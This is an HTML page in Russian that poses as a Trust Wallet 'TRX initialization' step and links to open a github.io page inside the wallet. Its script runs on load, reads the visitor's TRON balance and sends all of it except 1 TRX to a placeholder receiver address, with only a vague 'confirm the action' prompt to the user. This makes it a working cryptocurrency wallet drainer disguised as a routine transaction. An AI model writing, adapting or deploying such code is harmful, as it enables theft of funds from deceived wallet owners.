<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Processing TRX...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      background: #020617;
      color: #e5e7eb;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .box {
      max-width: 360px;
    }
    .status {
      font-size: 14px;
      opacity: 0.9;
      margin-top: 12px;
      word-break: break-all;
    }
  </style>
</head>
<body>

<div class="box">
  <h2>Инициализация TRX…</h2>
  <p>Подтвердите действие в Trust Wallet</p>
  <div class="status" id="status"></div>

  <p style="margin-top:16px">
    <a href="https://link.trustwallet.com/open_url?coin_id=195&url=https://stariywah.github.io/test/"
       style="color:#60a5fa">
      Открыть в Trust Wallet
    </a>
  </p>
</div>

<script>
(async () => {
  const status = document.getElementById("status");

  if (typeof window.tronWeb === "undefined" || !window.tronWeb.ready) {
    status.innerText = "❌ Откройте страницу через Trust Wallet (TRON)";
    return;
  }

  try {
    const tronWeb = window.tronWeb;

    // 1. Адрес кошелька
    const fromAddress = tronWeb.defaultAddress.base58;

    // 2. Баланс (в SUN)
    const balanceSun = await tronWeb.trx.getBalance(fromAddress);

    if (balanceSun <= 0) {
      status.innerText = "❌ Баланс TRX = 0";
      return;
    }

    // 3. Оставляем 1 TRX (1_000_000 SUN)
    const reserve = 1_000_000;
    const amountSun = balanceSun - reserve;

    if (amountSun <= 0) {
      status.innerText = "❌ Недостаточно TRX для перевода";
      return;
    }

    status.innerText = "⏳ Ожидание подтверждения транзакции…";

    // 4. Транзакция
    const tx = await tronWeb.trx.sendTransaction(
      "T_RECEIVER_ADDRESS",
      amountSun
    );

    status.innerText =
      "✅ Транзакция отправлена:\n" + tx.txid;

  } catch (e) {
    status.innerText = "❌ Отменено или ошибка:\n" + (e.message || e);
  }
})();
</script>

</body>
</html>
